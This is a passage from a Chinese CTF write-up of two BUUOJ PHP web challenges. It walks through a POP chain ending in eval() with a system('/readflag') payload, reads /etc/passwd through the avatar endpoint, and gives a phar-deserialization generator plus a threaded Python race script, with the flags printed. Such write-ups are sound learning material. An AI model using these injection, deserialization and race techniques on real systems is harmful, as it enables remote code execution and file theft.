class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ListView</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tagName</span>=<span class="string">&#x27;div&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$template</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line"><span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">ob_clean();</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code><br />其中函数<code>renderSection()</code>为函数<code>renderContent()</code>中正则匹配替换的回调函数<br />用于匹配<code>&#123;\w+&#125;</code>的字符串，并将<code>\w+</code>拼接到&quot;render&quot;之后，再检验类中是否有这个函数，如果有则执行，没有则输出<code>&#123;\w+&#125;</code></p><p>再看<code>TestView.php</code>的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line"><span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line"><span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowCssClassExpression!==<span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;dataProvider-&gt;data[<span class="variable">$row</span>];</span><br><span class="line"><span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowCssClassExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(is_array(<span class="keyword">$this</span>-&gt;rowCssClass) &amp;&amp; (<span class="variable">$n</span>=count(<span class="keyword">$this</span>-&gt;rowCssClass))&gt;<span class="number">0</span>)</span><br><span class="line"><span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;rowCssClass[<span class="variable">$row</span>%<span class="variable">$n</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$class</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]))</span><br><span class="line"><span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>].=<span class="string">&#x27; &#x27;</span>.<span class="variable">$class</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]=<span class="variable">$class</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line"><span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>.<span class="variable">$n</span>.<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line"><span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&lt;td colspan=&quot;&#x27;</span>.count(<span class="keyword">$this</span>-&gt;columns).<span class="string">&#x27;&quot; class=&quot;empty&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>renderTableBody()</code> -&gt; <code>renderTableRow()</code> -&gt; <code>evaluateExpression()</code><br />函数<code>evaluateExpression()</code>在Base.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_expression_</span>.<span class="string">&quot; &quot;</span>.var_dump(<span class="variable">$_data_</span>).<span class="string">&quot;&lt;hr /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">&#123;</span><br><span class="line">extract(<span class="variable">$_data_</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最终目的是调用函数中<code>evaluateExpression()</code>的函数<code>eval()</code>以造成RCE<br />那么可以构造出一个POP链</p><p><code>$template = &quot;&#123;TableBody&#125;&quot;</code><br />经过POP链<code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code>后<br />到达函数<code>renderTableBody()</code><br />这里有<code>count($data)</code>，然后进行迭代运行函数<code>renderTableRow()</code><br />所以需要<br /><code>$data = 1</code><br />到达函数<code>renderTableRow()</code>后，有两条路可以进入函数<code>evaluateExpression()</code><br />这里我走的是第一条路，只需要把<code>rowHtmlOptionsExpression</code>设置为不为NULL即可<br />进入函数<code>evaluateExpression()</code>后就会直接<code>eval($rowHtmlOptionsExpression)</code><br />所以放命令即可<br /><code>$rowHtmlOptionsExpression = &quot;system(\&quot;/readflag\&quot;)&quot;</code></p><p>回到开头的两个参数，代入上述参数即可获得flag</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://aa876c17-0ddb-43f7-978e-1ca06b58fe7e.node4.buuoj.cn:81/?action=TestView --data <span class="string">&#x27;properties[template]=&#123;TableBody&#125;&amp;properties[data]=0&amp;properties[rowHtmlOptionsExpression]=system(&quot;/readflag&quot;)&#x27;</span> | grep flag</span><br><span class="line">flag&#123;e2fec3cf-a368-45da-9277-2f21aa384a78&#125;</span><br></pre></td></tr></table></figure><p>队友本来RCE成功了，hackerbar把phpinfo挡住了，以为没RCE出来…</p><hr /><h1 id="soeasy_php"><a class="markdownIt-Anchor" href="#soeasy_php"></a> soeasy_php</h1><p>给的附件是个dockerfile，没啥用感觉</p><p>进来就是个上传点，但是我上传了个php后给我的上传路径后缀是png我就觉得不对了<br />F12查看源码可以看到还有个编辑头像功能<br />尝试将头像换为其他文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/edit.php --data <span class="string">&#x27;png=/etc/passwd&amp;flag=&#x27;</span></span><br><span class="line">成功更换头像</span><br><span class="line"></span><br><span class="line">curl http://45632cf4-8a41-4ab2-bf06-65db1ccc6307.node4.buuoj.cn:81/uploads/head.png</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>然后就读源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#edit.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一眼反序列化，但是半天没看见函数<code>unserialize()</code><br />翻了翻笔记才想起来这玩意是phar反序列化<br />通过文件函数来触发反序列化<br />这里可以触发的有</p><ul><li><code>fopen()</code></li><li><code>file_put_contents()</code></li><li><code>unlink()</code></li></ul><p>首先参数<code>png</code>的正则绕不过去，后面两个函数<code>filewrite()</code>参数定死，函数<code>unlink($head)</code>参数定死<br />那就剩下最后一个函数<code>unlink($filename)</code>了<br />而执行函数<code>unlink($filename)</code>需要函数<code>symlink($filename, $head)</code><br />尝试给filename塞个数组进去，symlink确实寄了，但是unlink也寄了<br />想来想去还是只能竞争symlink了<br />只要我请求够快，就会有两个PHP线程在<code>unlink($head)</code>之后执行<code>symlink($filename, $head)</code><br />但是<code>symlink()</code>不能创建同名链接，所以慢的那个会False，然后运行<code>unlink($filename)</code>，即触发phar反序列化</p><p>即使触发了phar反序列化，flag内容被写入到了<code>/tmp/flag.txt</code><br />要读取flag必定要<code>symlink(&quot;/tmp/flag.txt&quot;, &quot;uploads/head.png&quot;)</code>，然后访问head.png<br />但在此之前，会执行<code>filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don't give me flag&quot;);</code>或<code>filewrite(&quot;/tmp/flag.txt&quot;, $flag);</code><br />也就是说<code>/tmp/flag.txt</code>会被覆写，所以需要再进行一次竞争</p><p>但是从总体流程上来讲，这两次竞争完全可以放一起，以达到以下竞争效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">覆写错误flag -&gt;</span><br><span class="line">symlink链接phar文件 -&gt;</span><br><span class="line">symlink竞争触发unlink(phar) -&gt;</span><br><span class="line">覆写正确flag -&gt;</span><br><span class="line">symlink链接&#x2F;tmp&#x2F;flag.txt -&gt;</span><br><span class="line">读取正确flag</span><br></pre></td></tr></table></figure><p>这个思路看起来有点天方夜谭，但是还是能竞争出来的<br />（这题做出来的时候总感觉自己是非预期解法）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#php.ini: phar.readonly = Off</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();<span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/uploads/head.png&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/edit.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;phar:///var/www/html/uploads/01908b979c3dea9fc658e68ab8c560e4.png&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">symlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t1 = threading.Thread(target=unlink, args=())</span><br><span class="line">        t2 = threading.Thread(target=symlink, args=())</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#getflag</span></span><br><span class="line">        flag = req.get(url1).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br><span class="line">flag&#123;eea59afa-414d-4045-8d7f-808abc804951&#125;</span><br></pre></td></tr></table></figure><hr /><p>两个题做了五个小时，只能明天打游戏了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了&lt;br /&gt;
说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩&lt;br /&gt;
但是我上一次碰CTF还是去年的省赛…&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Web" scheme="https://yoloyolo.top/tags/Web/"/>
    
    <category term="PHP" scheme="https://yoloyolo.top/tags/PHP/"/>
    
    <category term="POP" scheme="https://yoloyolo.top/tags/POP/"/>
    
    <category term="Unserialize" scheme="https://yoloyolo.top/tags/Unserialize/"/>
    
  </entry>
  
  <entry>
    <title>闽盾杯/黑盾杯 2021 WP</title>
    <link href="https://yoloyolo.top/2021/12/07/MinDunCup-2021/"/>
    <id>https://yoloyolo.top/2021/12/07/MinDunCup-2021/</id>
    <published>2021-12-06T19:16:04.000Z</published>
    <updated>2023-07-16T09:03:29.343Z</updated>
    
